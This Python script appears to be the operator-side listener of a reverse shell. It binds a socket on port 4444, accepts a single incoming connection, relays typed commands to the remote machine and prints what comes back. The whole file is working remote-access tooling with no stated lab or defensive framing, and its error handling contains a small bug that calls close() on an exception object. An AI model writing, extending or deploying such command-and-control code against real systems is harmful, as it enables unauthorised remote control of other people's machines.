import socket
import sys

def send_commands(s, conn):
    print("\nCtrl + C to kill the connection.")
    print("Browse the system as usual.")
    print("$: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096) 
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            print("\nKilled The Connection")
            conn.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            e.close()
            sys.exit()

def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server Initialized. Listening...")
    except Exception as e:
        print("\nAn Error Occured")
        print(e)
        restart = input("\nReinitialize the Server? y/n ")
        if restart.lower() == "y" or restart.lower() == "yes":
            print("\nRoger That. Reinitializing the server...\n")
            server(address)
        else:
            print("\nKilling Myself...\n")
            sys.exit()
    conn, client_addr = s.accept()
    print(f"Connection Established: {client_addr}")
    send_commands(s, conn)

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    server((host, port))
        
        
